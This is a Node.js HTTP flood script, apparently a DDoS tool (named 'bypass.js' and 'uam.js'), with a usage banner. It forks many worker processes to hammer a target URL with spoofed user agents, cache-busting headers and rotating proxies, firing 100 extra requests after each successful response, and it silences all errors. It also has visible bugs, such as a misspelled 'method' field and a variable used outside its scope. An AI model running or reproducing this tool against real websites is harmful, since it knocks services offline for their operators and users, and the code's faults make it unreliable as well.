require('events').EventEmitter.defaultMaxListeners = 0;
const request = require('request')
const fakeUa = require('fake-useragent')
const fs = require('fs')
const cluster = require('cluster')
async function mainprocess(){
    if (process.argv.length != 6){
        console.log("USAGE : node bypass.js url thread time raw/proxy.txt")
        console.log(`
        ▄▀▀█▄▄▄▄  ▄▀▀█▄▄▄▄  ▄▀▀▀▀▄     
        ▐  ▄▀   ▐ ▐  ▄▀   ▐ █ █   ▐     
          █▄▄▄▄▄    █▄▄▄▄▄     ▀▄       
          █    ▌    █    ▌  ▀▄   █      
         ▄▀▄▄▄▄    ▄▀▄▄▄▄    █▀▀▀       
         █    ▐    █    ▐    ▐          
         ▐         ▐                    
    `)
    console.log("EXEMP: node uam.js https://google.com 10 1000 raw/proxy.txt")
        process.exit()
    }
    else{
    	Array.prototype.remove_by_value = function(val) {
            for (var i = 0; i < this.length; i++) {
            if (this[i] === val) {
                this.splice(i, 1);
                i--;
            }
            }
            return this;
        }
        function run(){
            if (process.argv[5] == 'raw'){
                var http={
                    url:process.argv[2],
                    medthod:'get',
                    headers:{
                        'user-agent':fakeUa(),
                        'Cache-Control': 'no-cache'
                    }
                }
                request(http,function(e,r){
                })
                if (r.statusCode > 226){
                	for (let q=0;q<100;q++){
                    request(http)}
                }
            }
            else if(process.argv[5] == process.argv[5]){                
                var proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n'); 
                
                var proxy = proxies[Math.floor(Math.random()* proxies.length)]
                proxyrequests = request.defaults({'proxy':'http://'+proxy})
                var config={
                    url:process.argv[2],
                    medthod:'get',
                    headers:{
                        'user-agent':fakeUa(),
                        'Cache-Control': 'no-cache'
                    }
                }
                proxyrequests(config,function(e,r){
                    if (proxies.length == 0){
                    process.exit(0)
                     }
                    if (r.statusCode >= 200 && r.statusCode <= 226 ){
                  for (let i=0;i<100;i++){
                    proxyrequests(config)
                  }          
                }
                else{
                        proxies = proxies.remove_by_value(proxy)
                    }                     
                })
                        
            }                       
        }
    }
    function thread(){
        setInterval(()=>{
            run()
        })
    }
    async function main(){
    if (cluster.isMaster){
        for (let i=0;i<process.argv[3];i++){
            cluster.fork()                          
        }
    cluster.on("exit",function(){
        cluster.fork()
    })
    }
    else{
        thread()
    }
    }
main()    
}
process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});

setTimeout(()=>{
    process.exit()
},process.argv[4] * 1000)
mainprocess()
